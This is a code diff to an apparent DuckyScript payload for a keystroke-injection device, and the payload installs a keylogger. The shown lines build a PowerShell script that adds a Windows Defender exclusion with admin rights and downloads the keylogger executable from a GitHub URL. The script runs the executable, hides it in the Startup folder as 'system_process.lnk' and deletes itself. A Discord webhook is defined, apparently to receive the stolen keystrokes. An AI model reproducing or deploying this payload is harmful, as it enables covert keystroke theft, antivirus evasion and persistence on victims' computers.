@@ -1,5 +1,6 @@
 DEFINE #URL https://discord.com/api/webhooks/
 DEFINE #LINES 300
+DEFINE #EXE https://github.com/wishtag/keylogger/raw/refs/heads/main/dist/main.exe
 
 DELAY 100
 GUI r
@@ -37,7 +38,7 @@ STRINGLN mkdir "%USERPROFILE%\Source" 2>nul & (echo #URL && echo #LINES) > "%USE
 DELAY 500
 
 REM Create the .ps1 file
-STRINGLN mkdir "%USERPROFILE%\Source" 2>nul & (echo mkdir "$env:windir\temp\Cache" & echo Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force' & echo Invoke-WebRequest -Uri "https://github.com/wishtag/keylogger/raw/refs/heads/main/dist/main.exe" -OutFile "$env:windir\temp\Cache\main.exe" & echo Start-Process "$env:windir\temp\Cache\main.exe" & echo $s=^(New-Object -COM WScript.Shell^).CreateShortcut^("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\system_process.lnk"^);$s.TargetPath="$env:windir\temp\Cache\main.exe";$s.Save^(^) & echo Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force & echo EXIT) > "%USERPROFILE%\Source\dl.ps1"
+STRINGLN mkdir "%USERPROFILE%\Source" 2>nul & (echo mkdir "$env:windir\temp\Cache" & echo Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force' & echo Invoke-WebRequest -Uri "#EXE" -OutFile "$env:windir\temp\Cache\main.exe" & echo Start-Process "$env:windir\temp\Cache\main.exe" & echo $s=^(New-Object -COM WScript.Shell^).CreateShortcut^("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\system_process.lnk"^);$s.TargetPath="$env:windir\temp\Cache\main.exe";$s.Save^(^) & echo Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force & echo EXIT) > "%USERPROFILE%\Source\dl.ps1"
 DELAY 500
 
 REM Run .ps1 file which does most of the heavy lifting with downloading and stuff
